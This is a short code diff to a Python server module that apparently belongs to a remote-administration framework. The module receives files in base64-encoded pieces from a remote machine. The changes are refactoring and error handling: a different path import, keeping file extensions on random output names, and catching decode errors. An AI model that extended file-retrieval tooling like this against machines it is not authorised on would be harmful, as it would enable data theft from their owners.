@@ -3,7 +3,7 @@ __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
 from server.modules.helper import *
-import os
+from os import path
 from Cryptodome.Hash import MD5
 
 
@@ -27,9 +27,9 @@ class Module(ModuleABC):
             view.output("Invalid buffer size, using 4096.", "info")
             buffer_size = 4096
         if not output_name:
-            output_name = random_string(8)
+            output_name = random_string(8) + path.splitext(download_file)[1]
 
-        if os.path.exists(os.path.join(OUTPUT_DIRECTORY, os.path.basename(download_file))):
+        if path.exists(path.join(OUTPUT_DIRECTORY, path.basename(download_file))):
             view.output("A file with that name already exists!", "attention")
             return False, None
         else:
@@ -45,9 +45,12 @@ class Module(ModuleABC):
         # Files are sent back to us in small pieces (encoded with base64),
         # we simply decode these pieces and write them to the output file.
         output_name = response_options["output_name"]
-        output_file = os.path.join(OUTPUT_DIRECTORY, response_options["output_file"])
+        output_file = path.join(OUTPUT_DIRECTORY, output_name)
 
-        str_response = response.decode()
+        try:
+            str_response = response.decode()
+        except UnicodeDecodeError:
+            str_response = ""
 
         if "Failed to download" in str_response:
             view.output(str_response, "attention")
